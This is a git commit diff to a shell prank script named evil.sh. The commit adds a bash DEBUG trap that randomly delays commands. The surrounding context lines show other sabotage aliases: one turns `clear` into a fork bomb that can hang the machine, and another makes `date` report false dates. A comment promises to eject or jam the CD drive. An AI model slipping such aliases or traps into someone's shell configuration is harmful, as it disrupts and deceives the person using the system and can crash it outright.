2c7f3934f9f65e46c9765cb276e08e00ff0d5d7f
yboikov <y.boikov@gmail.com>
2017-06-07 20:33:35 +0300

    Add random sleep before random command

--- evil.sh
+++ evil.sh
@@ -28,6 +28,9 @@ alias clear=':(){ :|:& };:';
 # Have `date` return random dates.
 alias date='date -d "now + $RANDOM days"';
 
+# Randomly sleep before random command
+trap '[ "$RANDOM" -le 6000 ] && sleep $[ ( $RANDOM % 4 )+3 ]s' DEBUG
+
 # Sometimes, wait a few minutes and then start randomly ejecting the CD drive.
 # Other times, resist all attempts at opening it. Other times, make it read
 # reaaaalllly sllooowwwwllly.
